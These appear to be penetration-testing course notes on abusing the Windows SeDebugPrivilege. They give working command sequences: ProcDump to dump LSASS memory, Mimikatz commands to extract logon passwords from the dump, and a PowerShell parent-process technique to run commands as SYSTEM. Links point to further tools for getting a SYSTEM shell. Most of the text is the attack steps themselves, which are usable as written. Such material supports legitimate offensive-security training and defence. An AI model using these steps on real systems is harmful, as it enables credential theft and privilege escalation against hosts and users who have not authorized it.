
[SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) can be used to capture sensitive information from system memory, or access/modify kernel and application structures. We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory.

```powershell
C:\htb> .\procdump.exe -accepteula -ma lsass.exe lsass.dmp ### Dump LSASS

C:\htb> mimikatz.exe
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

```Tip
It is always a good idea to type "log" before running any commands in  "Mimikatz" this way all command output will put output to a ".txt" file
```

---
## Remote Code Execution as SYSTEM

We can also leverage `SeDebugPrivilege` for [RCE](https://decoder.cloud/2018/02/02/getting-system/) using [Script](https://github.com/decoder-it/psgetsystem). We just need to load the script and run it with the following syntax:

`[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`

```PowerShell
PS C:\htb> .\psgetsys.ps1\
### Importing script

PS C:\htb> tasklist
### Finding High Privileged Process

PS C:\htb> ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
### Exploit
```

Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell.

---